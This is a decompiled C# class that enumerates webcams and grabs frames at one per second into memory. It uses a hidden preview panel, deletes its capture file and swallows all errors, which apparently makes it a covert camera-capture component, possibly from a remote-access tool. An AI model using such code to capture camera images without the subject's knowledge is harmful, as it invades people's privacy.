using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using cam.DirectX.Capture;

namespace cam
{
	// Token: 0x02000040 RID: 64
	public class A
	{
		// Token: 0x06000160 RID: 352 RVA: 0x000108B0 File Offset: 0x0000EAB0
		public A()
		{
			this.bzy = false;
			this.Siz = new Size(1, 1);
			this.Drive = -1;
			this.M = null;
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000161 RID: 353 RVA: 0x000108DC File Offset: 0x0000EADC
		// (set) Token: 0x06000162 RID: 354 RVA: 0x000108E4 File Offset: 0x0000EAE4
		private virtual Capture o
		{
			get
			{
				return this._o;
			}
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._o = value;
			}
		}

		// Token: 0x06000163 RID: 355 RVA: 0x000108F0 File Offset: 0x0000EAF0
		public void close()
		{
			try
			{
				this.o.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.th.Abort();
			}
			catch (Exception ex2)
			{
			}
			this.th = null;
			this.bzy = false;
			this.Drive = -1;
		}

		// Token: 0x06000164 RID: 356 RVA: 0x00010970 File Offset: 0x0000EB70
		public string[] Divs()
		{
			List<string> list = new List<string>();
			checked
			{
				string[] result;
				try
				{
					Filters filters = new Filters();
					int num = 0;
					int num2 = filters.VideoInputDevices.Count - 1;
					for (int i = num; i <= num2; i++)
					{
						list.Add(filters.VideoInputDevices[i].Name);
					}
					result = list.ToArray();
				}
				catch (Exception ex)
				{
					result = null;
				}
				return result;
			}
		}

		// Token: 0x06000165 RID: 357 RVA: 0x000109F4 File Offset: 0x0000EBF4
		public void onn(int i, Size Siz)
		{
			this.close();
			this.Siz = Siz;
			this.Drive = i;
			this.bzy = true;
			Filters filters = new Filters();
			this.o = new Capture(filters.VideoInputDevices[i], null);
			this.o.VideoCompressor = filters.VideoCompressors[0];
			this.o.FrameRate = 1.0;
			this.o.PreviewWindow = new Panel();
			this.o.FrameEvent2 += this.img;
			this.o.GrapImg();
		}

		// Token: 0x06000166 RID: 358 RVA: 0x00010A98 File Offset: 0x0000EC98
		private void img(Bitmap x)
		{
			try
			{
				this.M = (Image)x.Clone();
				if (File.Exists(this.o.Filename))
				{
					File.Delete(this.o.Filename);
				}
				x.Dispose();
			}
			catch (Exception ex)
			{
			}
			try
			{
				this.th = Thread.CurrentThread;
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000140 RID: 320
		[AccessedThroughProperty("o")]
		private Capture _o;

		// Token: 0x04000141 RID: 321
		public bool bzy;

		// Token: 0x04000142 RID: 322
		public Size Siz;

		// Token: 0x04000143 RID: 323
		public int Drive;

		// Token: 0x04000144 RID: 324
		private Thread th;

		// Token: 0x04000145 RID: 325
		public Image M;
	}
}
